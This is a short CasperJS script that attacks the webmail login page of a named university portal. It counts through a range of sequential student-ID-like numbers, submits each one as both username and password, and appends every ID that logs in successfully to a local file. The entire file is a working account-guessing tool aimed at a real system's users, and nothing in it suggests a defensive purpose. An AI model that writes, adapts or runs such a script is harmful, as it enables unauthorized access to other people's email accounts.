var casper = require('casper').create();
var fs = require('fs');

//15021306
var id = parseInt(casper.cli.args[0]);


function search() {
		casper.echo(++id);
		casper.thenOpen('http://ctmail.vnu.edu.vn/webmail/src/login.php');

		casper.then(function () {
			this.fillSelectors('form[action="redirect.php"]', {
				'input[name="login_username"]': id.toString(),
				'input[name="secretkey"]': id.toString(),
				'input[name="js_autodetect_results"]': 1
			}, true);
		});
		
		casper.waitForSelector('title');

		casper.then(function () {
			if (this.getTitle() == 'UETmail') {
				this.echo('Found!');
				fs.write('60.txt', id.toString() + '\n', 'a');
			}
		});
}

casper.start('http://ctmail.vnu.edu.vn/webmail/src/login.php');

casper.then(function () {
	this.repeat(2014, search);
});

casper.run();
